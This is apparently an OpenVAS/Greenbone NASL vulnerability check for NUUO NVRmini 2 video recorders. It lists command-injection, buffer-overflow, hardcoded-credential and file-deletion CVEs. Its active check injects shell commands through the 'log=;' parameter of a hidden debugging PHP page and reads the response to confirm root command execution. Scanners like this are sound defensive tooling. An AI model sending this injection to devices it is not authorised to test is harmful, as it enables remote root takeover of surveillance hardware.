# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nuuo:nuuo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107042");
  script_version("2025-02-27T08:17:42+0000");
  script_tag(name:"last_modification", value:"2025-02-27 08:17:42 +0000 (Thu, 27 Feb 2025)");
  script_tag(name:"creation_date", value:"2016-08-23 13:16:06 +0200 (Tue, 23 Aug 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-09-03 01:29:00 +0000 (Sun, 03 Sep 2017)");

  script_cve_id("CVE-2016-5674", "CVE-2016-5675", "CVE-2016-5676", "CVE-2016-5677",
                "CVE-2016-5678", "CVE-2016-5679", "CVE-2016-5680", "CVE-2016-15038");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("NUUO NVRmini 2 <= 3.0.8 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_nuuo_devices_http_detect.nasl");
  script_mandatory_keys("nuuo/device/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"NUUO NVRmini 2 devices are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2016-5674: The hidden page '__debugging_center_utils__.php' fails to properly validate the
  log parameter

  - CVE-2016-5675: The 'handle_daylightsaving.php' page does not sanitise the NTPServer parameter

  - CVE-2016-5676: An error in the cgi-bin/cgi_system binary

  - CVE-2016-5677: The hidden page '__nvr_status___.php' fails to properly validate the parameter

  - CVE-2016-5678: Hardcoded root credentials

  - CVE-2016-5679: The sn parameter of the 'transfer_license' command in cgi_main does not properly
  validate user-provided input

  - CVE-2016-5680: Stack-based buffer overflow in cgi-bin/cgi_main

  - CVE-2016-15038: Arbitrary file deletion");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code as the root user and send a specially crafted request to stack-based buffer
  overflow.");

  script_tag(name:"affected", value:"NUUO NVRmini 2 devices version 3.0.8 and prior are known
  to be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/138220/NUUO-3.0.8-Remote-Root.html");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40200");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/92318");
  script_xref(name:"URL", value:"http://www.vfocus.net/art/20160809/12861.html");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/856152");
  script_xref(name:"URL", value:"https://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5353.php");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40214");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

cmds = exploit_commands( "linux" );

foreach pattern( keys( cmds ) ) {

  cmd = cmds[pattern];

  url = "/__debugging_center_utils___.php?log=;" + cmd;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );
